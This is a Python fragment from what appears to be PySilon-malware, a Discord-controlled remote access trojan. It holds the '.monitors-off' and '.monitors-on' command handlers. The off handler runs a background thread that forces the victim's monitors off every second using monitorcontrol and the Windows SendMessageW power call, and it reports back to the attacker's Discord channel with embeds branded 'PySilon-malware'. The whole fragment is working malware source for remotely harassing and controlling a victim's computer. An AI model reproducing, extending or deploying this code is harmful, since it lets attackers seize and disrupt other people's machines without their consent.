import monitorcontrol
import threading
import time
import ctypes

se_ha_apagado = False

elif message.content == '.monitors-off':
    if not se_ha_apagado:
        await message.delete()
        se_ha_apagado = True
        
        def apagar_pantallas():
            global se_ha_apagado
            while se_ha_apagado:
                try:
                    for monitor in monitorcontrol.get_monitors():
                        with monitor:
                            monitor.set_power_mode(4)
                except Exception:
                    pass
                ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
                time.sleep(1)

        threading.Thread(target=apagar_pantallas, daemon=True).start()

        embed = discord.Embed(title="🟢 Success", description='```Monitor turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)

    else:
        embed = discord.Embed(title="🔴 Hold on!", description='```Monitor already turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)

elif message.content == '.monitors-on':
    if se_ha_apagado:
        await message.delete()
        se_ha_apagado = False

        def encender_pantallas():
            try:
                for monitor in monitorcontrol.get_monitors():
                    with monitor:
                        monitor.set_power_mode(1)
            except Exception:
                pass
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)

        threading.Thread(target=encender_pantallas, daemon=True).start()

        embed = discord.Embed(title="🟢 Success", description='```Monitor has been turned on. Turn it off by using .monitors-off```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
    else: 
        embed = discord.Embed(title="🔴 Hold on!", description='```The monitor is not turned off. Turn it off by using .monitors-off```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
